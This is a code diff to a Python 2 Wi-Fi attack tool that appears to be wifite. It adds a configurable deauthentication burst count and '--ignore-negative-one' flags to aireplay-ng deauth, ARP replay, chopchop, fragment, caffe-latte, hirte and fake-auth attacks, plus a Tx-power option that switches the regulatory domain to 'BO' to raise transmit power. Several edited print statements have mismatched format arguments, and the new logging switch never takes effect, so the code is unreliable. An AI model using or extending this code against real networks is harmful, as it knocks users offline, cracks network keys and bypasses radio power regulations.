@@ -69,7 +69,7 @@ import random     # Generating a random MAC address.
 import errno      # Error numbers
 
 from sys import argv          # Command-line arguments
-from sys import stdout, stdin # Flushing
+from sys import stdout          # Flushing
 
 from shutil import copy # Copying .cap files
 
@@ -98,6 +98,8 @@ GR = '\033[37m' # gray
 
 # /dev/null, send output from programs so they don't print to screen.
 DN = open(os.devnull, 'w')
+ERRLOG = open(os.devnull, 'w')
+OUTLOG = open(os.devnull, 'w')
 
 ###################
 # DATA STRUCTURES #
@@ -148,6 +150,7 @@ class RunConfiguration:
         # WPA variables
         self.WPA_DISABLE          = False # Flag to skip WPA handshake capture
         self.WPA_STRIP_HANDSHAKE  = True  # Use pyrit or tshark (if applicable) to strip handshake
+        self.WPA_DEAUTH_COUNT     = 5     # Count to send deauthentication packets
         self.WPA_DEAUTH_TIMEOUT   = 10    # Time to wait between deauthentication bursts (in seconds)
         self.WPA_ATTACK_TIMEOUT   = 500   # Total time to allow for a handshake attack (in seconds)
         self.WPA_HANDSHAKE_DIR    = 'hs'  # Directory in which handshakes .cap files are stored
@@ -256,16 +259,6 @@ class RunConfiguration:
         """
             Handles command-line arguments, sets global variables.
         """
-        global WIRELESS_IFACE, TARGET_CHANNEL, DO_NOT_CHANGE_MAC, TARGET_ESSID, TARGET_BSSID
-        global WPA_DISABLE, WPA_STRIP_HANDSHAKE, WPA_DEAUTH_TIMEOUT, WPA_ATTACK_TIMEOUT
-        global WPA_DONT_CRACK, WPA_DICTIONARY, WPA_HANDSHAKE_TSHARK, WPA_HANDSHAKE_PYRIT
-        global WPA_HANDSHAKE_AIRCRACK, WPA_HANDSHAKE_COWPATTY
-        global WEP_DISABLE, WEP_PPS, WEP_TIMEOUT, WEP_ARP_REPLAY, WEP_CHOPCHOP, WEP_FRAGMENT
-        global WEP_CAFFELATTE, WEP_P0841, WEP_HIRTE, WEP_CRACK_AT_IVS, WEP_IGNORE_FAKEAUTH
-        global WEP_SAVE, SHOW_MAC_IN_SCAN, ATTACK_ALL_TARGETS, ATTACK_MIN_POWER
-        global WPS_DISABLE, WPS_TIMEOUT, WPS_RATIO_THRESHOLD, WPS_MAX_RETRIES
-        global VERBOSE_APS
-
         args = argv[1:]
         if args.count('-h') + args.count('--help') + args.count('?') + args.count('-help') > 0:
             help()
@@ -332,8 +325,20 @@ class RunConfiguration:
                     except IndexError: print R+' [!]'+O+' no power level given!'+W
                     else: print GR+' [+]'+W+' minimum target power set to %s' % (G+args[i] + "dB"+W)
                 elif args[i] == '-q' or args[i] == '-quiet':
-                    VERBOSE_APS = False
+                    self.VERBOSE_APS = False
                     print GR+' [+]'+W+' list of APs during scan '+O+'disabled'+W
+                elif args[i] == '-tx':
+                    i += 1
+                    try: self.TX_POWER = args[i]
+                    except IndexError:
+                        print R+' [!]'+O+' unable to set Tx power level; no level given'+W 
+                        exit_gracefully(1)
+                elif args[i] == '-logs' or args[i] == '-log':
+                    # Set output for errors/logs to append to local files instead of /dev/null
+                    ERRLOG = open('./error.log', 'a')
+                    OUTLOG = open('./out.log', 'a')
+                    print GR+' [+]'+W+' output and error logging '+G+'enabled'+W
+
 
                 elif args[i] == '-check':
                     i += 1
@@ -380,6 +385,10 @@ class RunConfiguration:
                     i += 1
                     self.WPA_DEAUTH_TIMEOUT = int(args[i])
                     print GR+' [+]'+W+' WPA deauth timeout set to %s' % (G+args[i]+' seconds'+W)
+                elif args[i] == '-wpac':
+                    i += 1
+                    self.WPA_DEAUTH_COUNT = int(args[i])
+                    print GR+' [+]'+W+' WPA deauth count set to %s' % (G+args[i]+' packets'+W)
                 elif args[i] == '-wpat':
                     i += 1
                     self.WPA_ATTACK_TIMEOUT = int(args[i])
@@ -903,6 +912,11 @@ def enable_monitor_mode(iface):
     call(['airmon-ng', 'start', iface], stdout=DN, stderr=DN)
     print 'done'
     RUN_CONFIG.IFACE_TO_TAKE_DOWN = get_iface()
+    if RUN_CONFIG.TX_POWER > 0:
+        print GR+' [+]'+W+' setting Tx power to %s%s%s...' % (G, RUN_CONFIG.TX_POWER, W),
+        call(['iw', 'reg', 'set', 'BO'], stdout=OUTLOG, stderr=ERRLOG)
+        call(['iwconfig', iface, 'txpower', RUN_CONFIG.TX_POWER], stdout=OUTLOG, stderr=ERRLOG)
+        print 'done'
     return RUN_CONFIG.IFACE_TO_TAKE_DOWN
 
 def disable_monitor_mode():
@@ -1091,7 +1105,8 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
                         stdout.flush()
                         # Time to deauth
                         cmd = ['aireplay-ng',
-                               '--deauth', '1',
+                               '--ignore-negative-one',
+                               '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
                                '-a', t.bssid]
                         for c in clients:
                             if c.station == t.bssid:
@@ -1590,7 +1605,7 @@ def analyze_capfile(capfile):
         if RUN_CONFIG.TARGET_BSSID == '':
             print R+' [!]'+O+' unable to guess BSSID from ESSID!'
         else:
-            print GR+' [+]'+W+' guessed bssid: %s' % (G+TARGET_BSSID+W)
+            print GR+' [+]'+W+' guessed bssid: %s' % (G+RUN_CONFIG.TARGET_BSSID+W)
     
     if RUN_CONFIG.TARGET_BSSID != '' and RUN_CONFIG.TARGET_ESSID == '':
         RUN_CONFIG.TARGET_ESSID = get_essid_from_cap(RUN_CONFIG.TARGET_BSSID, capfile)
@@ -1694,8 +1709,8 @@ def exit_gracefully(code=0):
     global RUN_CONFIG
     # Remove temp files and folder
     if os.path.exists(RUN_CONFIG.temp):
-        for file in os.listdir(RUN_CONFIG.temp):
-            os.remove(RUN_CONFIG.temp + file)
+        for f in os.listdir(RUN_CONFIG.temp):
+            os.remove(RUN_CONFIG.temp + f)
         os.rmdir(RUN_CONFIG.temp)
     # Disable monitor mode if enabled by us
     disable_monitor_mode()
@@ -1809,19 +1824,21 @@ def wpa_get_handshake(iface, target, clients):
             if seconds_running % RUN_CONFIG.WPA_DEAUTH_TIMEOUT == 0: 
                 # Send deauth packets via aireplay-ng
                 cmd = ['aireplay-ng', 
+                      '--ignore-negative-one',
                       '-0',  # Attack method (Deauthentication)
-                       '1',  # Number of packets to send
+                       str(RUN_CONFIG.WPA_DEAUTH_COUNT),  # Number of packets to send
                       '-a', target.bssid]
                 
                 client_index += 1
                 
                 if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
                     print " %s sending 1 deauth to %s*broadcast*%s..." % \
-                             (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G, W),
+                             (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, G+str(RUN_CONFIG.WPA_DEAUTH_COUNT)+W, G, W),
                     client_index = -1
                 else:
                     print " %s sending 1 deauth to %s... " % \
                              (GR+sec_to_hms(RUN_CONFIG.WPA_ATTACK_TIMEOUT - seconds_running)+W, \
+                              G+str(RUN_CONFIG.WPA_DEAUTH_COUNT)+W, \
                              G+target_clients[client_index].bssid+W),
                     cmd.append('-h')
                     cmd.append(target_clients[client_index].bssid)
@@ -2353,9 +2370,9 @@ def attack_wep(iface, target, clients):
                                '-l', RUN_CONFIG.temp + 'wepkey.txt']
                                #temp + 'wep-01.cap']
                         # Append all .cap files in temp directory (in case we are resuming)
-                        for file in os.listdir(RUN_CONFIG.temp):
-                            if file.startswith('wep-') and file.endswith('.cap'):
-                                cmd.append(RUN_CONFIG.temp + file)
+                        for f in os.listdir(RUN_CONFIG.temp):
+                            if f.startswith('wep-') and f.endswith('.cap'):
+                                cmd.append(RUN_CONFIG.temp + f)
 
                         print "\r %s started %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracking'+W, G, RUN_CONFIG.WEP_CRACK_AT_IVS, W)
                         proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
@@ -2429,6 +2446,7 @@ def attack_wep(iface, target, clients):
                 
                 # We were able to forge a packet, so let's replay it via aireplay-ng
                 cmd = ['aireplay-ng',
+                       '--ignore-negative-one',
                        '--arpreplay',
                        '-b', target.bssid,
                        '-r', RUN_CONFIG.temp + 'arp.cap', # Used the forged ARP packet
@@ -2587,6 +2605,7 @@ def wep_fake_auth(iface, target, time_to_display):
         stdout.flush()
         
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '-1', '0', # Fake auth, no delay
                '-a', target.bssid,
                '-T', '1'] # Make 1 attempt
@@ -2629,6 +2648,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
     cmd = ''
     if attack_num == 0:
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '--arpreplay',
                '-b', target.bssid,
                '-x', str(RUN_CONFIG.WEP_PPS)] # Packets per second
@@ -2642,6 +2662,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
         
     elif attack_num == 1:
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '--chopchop',
                '-b', target.bssid,
                '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
@@ -2658,6 +2679,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
         
     elif attack_num == 2:
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '--fragment',
                '-b', target.bssid,
                '-x', str(RUN_CONFIG.WEP_PPS), # Packets per second
@@ -2673,6 +2695,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
     
     elif attack_num == 3:
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '--caffe-latte',
                '-b', target.bssid]
         if len(clients) > 0:
@@ -2682,6 +2705,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
         
     elif attack_num == 4:
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '--interactive',
                '-b', target.bssid,
                '-c', 'ff:ff:ff:ff:ff:ff',
@@ -2696,6 +2720,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
             print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
             return ''
         cmd = ['aireplay-ng',
+               '--ignore-negative-one',
                '--cfrag',
                '-h', clients[0].bssid,
                iface]
@@ -2707,16 +2732,19 @@ def wep_send_deauths(iface, target, clients):
     """
         Sends deauth packets to broadcast and every client.
     """
+    global RUN_CONFIG
     # Send deauth to broadcast
     cmd = ['aireplay-ng',
-           '--deauth', '1',
+           '--ignore-negative-one',
+           '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
            '-a', target.bssid,
            iface]
     call(cmd, stdout=DN, stderr=DN)
     # Send deauth to every client
     for client in clients:
         cmd = ['aireplay-ng',
-                 '--deauth', '1',
+                 '--ignore-negative-one',
+                 '--deauth', str(RUN_CONFIG.WPA_DEAUTH_COUNT),
                  '-a', target.bssid,
                  '-h', client.bssid,
                  iface]
